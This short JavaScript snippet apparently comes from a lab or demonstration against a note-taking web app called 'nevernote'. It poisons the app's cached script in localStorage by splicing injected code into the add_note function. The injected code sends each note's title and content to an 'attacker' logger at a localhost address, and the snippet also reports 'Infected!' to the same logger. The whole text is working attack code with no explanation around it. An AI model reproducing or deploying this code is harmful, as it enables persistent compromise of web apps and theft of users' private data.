var code = localStorage["cache_nevernote.js"];
if (code.search(/INFECTION START/) < 0) {
	var pos = code.search(/function add_note()/);
	var before = code.substr(0, pos + 23);
	var after = code.substr(pos + 23);
	var malware = "/* INFECTION START */var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost:8000/attacker/logger.py?app=nevernote&msg=' + $('#noteadd_title').val()+' | '+$('#noteadd_content').val()); xhr.send();/* INFECTION END */";
	localStorage["cache_nevernote.js"] = before + malware + after;
	window.location.reload();
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', 'http://localhost:8000/attacker/logger.py?app=nevernote&msg=Infected!');
		xhr.send();
	} catch (e) {
	}
}
